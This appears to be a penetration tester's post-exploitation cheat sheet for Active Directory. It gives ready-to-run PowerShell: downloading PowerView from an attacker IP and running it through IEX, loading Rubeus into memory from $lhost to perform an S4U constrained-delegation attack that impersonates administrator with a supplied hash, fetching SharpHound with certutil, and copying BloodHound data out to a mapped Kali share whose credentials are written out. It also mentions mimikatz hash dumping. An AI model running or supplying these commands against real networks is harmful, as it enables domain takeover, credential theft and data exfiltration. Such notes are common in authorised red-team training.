# Post Exploitation



## General

### Method

```
# Dump hashes with mimikatz
# Run adPEAS make a list of the domains & trusts
# Run SharpHound against all domains
```

PowerView

{% code overflow="wrap" %}
```powershell
(new-object system.net.webclient).downloadstring('http://192.168.119.120/powerview.ps1') | IEX
```
{% endcode %}

Constrained Delegation

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong># Enumerate using PowerView
</strong><strong>Get-DomainComputer -TrustedToAuth
</strong><strong># Download Rubeus into memory
</strong>$data = (New-Object System.Net.WebClient).DownloadData('http://$lhost/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
# Invoking the purge function from Rubeus in memory
[Rubeus.Program]::Main("purge".Split())
# Using the S4U protocol transitions to request a TGS
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:12343649cc8ce713962859a2934b8cbb /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
# Displaying the requested TGS
klist
# Test ticket is working
ls \\file01\c$
</code></pre>

### SharpHound

Capture Data

```powershell
# Download SharpHound PowerShell version
certutil.exe -f -urlcache http://192.168.49.100/SharpHound.ps1 sharp.ps1
# Import Module
Import-Module sharp.ps1
# Run bloodhound
Invoke-BloodHound
# Map network drive back to Kali
net use x: \\192.168.49.100\visualstudio /user:kali @WSX2wsx
cd X:\
copy c:\temp\20221208210934_tricky.com_Bloodhound.zip
```

#### Analyze Results

```bash
# Start database
sudo neo4j console
# Start bloodhound
bloodhound
# Drop zip files into console
```

## AD PEAS

```powershell
. .\adPEAS.ps1
Invoke-adPEAS
```
